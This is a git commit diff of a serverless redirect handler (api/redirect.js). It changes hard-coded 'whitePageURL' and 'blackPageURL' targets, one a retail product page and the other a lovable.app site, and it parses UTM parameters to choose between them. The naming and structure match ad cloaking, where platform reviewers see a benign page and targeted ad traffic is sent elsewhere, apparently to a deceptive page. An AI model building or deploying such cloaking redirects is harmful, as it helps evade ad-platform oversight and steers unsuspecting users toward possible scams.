9061f0e013b82bbb7abc7928d73bb8e7b9db79ff
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-10 00:29:25 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://pinkpetals.pk/collections/new-arrivals/products/amber-gold?variant=46468169203935";
-    const blackPageURL = "https://cggkidswear.myfunnelish.com/super-active-toddler-jacket";
+    const whitePageURL = "https://www.roommate.dk/en/products/elefant-opbevaringskurv";
+    const blackPageURL = "https://photobatwaehub.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -24,4 +24,5 @@ export default function handler(req, res) {
     }
   
     res.end();
+
   }
